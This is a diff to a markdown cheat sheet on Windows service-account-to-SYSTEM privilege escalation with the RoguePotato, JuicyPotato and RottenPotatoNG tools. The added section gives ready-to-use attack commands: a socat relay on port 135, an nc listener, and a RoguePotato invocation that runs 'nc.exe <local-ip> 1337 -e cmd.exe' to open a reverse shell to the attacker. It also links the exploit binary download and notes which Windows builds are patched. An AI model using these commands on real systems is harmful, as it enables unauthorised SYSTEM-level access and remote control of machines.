@@ -1,18 +1,38 @@
-# JuicyPotato / RottenPotato(NG)
+# RoguePotato / JuicyPotato / RottenPotatoNG
 
 ##  Required privs
 
-```
+```cmd
 SeImpersonatePrivilege
 ```
--> Show privs via `whoami /priv`
+(show privs via `whoami /priv`)  
 
-## JuicyPotato
+## RoguePotato
+> Another Windows Local Privilege Escalation from Service Account to System  
+https://github.com/antonioCoco/RoguePotato
+
+Setup relay (can run e.g. on attacking machine)
+```bash
+socat tcp-listen:135,reuseaddr,fork tcp:<target-ip>:9999
+```
+
+Set up listener
+```bash
+nc -nlvp 1337
+```
+
+Run exploit
+```cmd
+RoguePotato.exe -r <relay-ip> -e "nc.exe <local-ip> 1337 -e cmd.exe" -l 9999
+```
+
+## JuicyPotato 
 > A sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM.  
 [Releases · ohpe/juicy-potato · GitHub](https://github.com/ohpe/juicy-potato/releases)  
 -> https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe  
 
-⚠️ **CAUTION: Windows 10 / Server 2019** ⚠️  
+⚠️ ** Microsoft patched this Vulnerability in Windows Versions 1809/Build 17763** ⚠️  
+(works until 1803 / 17134)  
 
 [No more rotten/juicy potato? – Decoder's Blog](https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/)
 
@@ -51,8 +71,8 @@ If not working (e.g. error 10038) try another `clsid` from
 * [juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise at master · ohpe/juicy-potato · GitHub](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise)
 
 ```
- -c '{<cls-id>}'
- ```
+-c '{<cls-id>}'
+```
 
 ## RottenPotatoNG
 
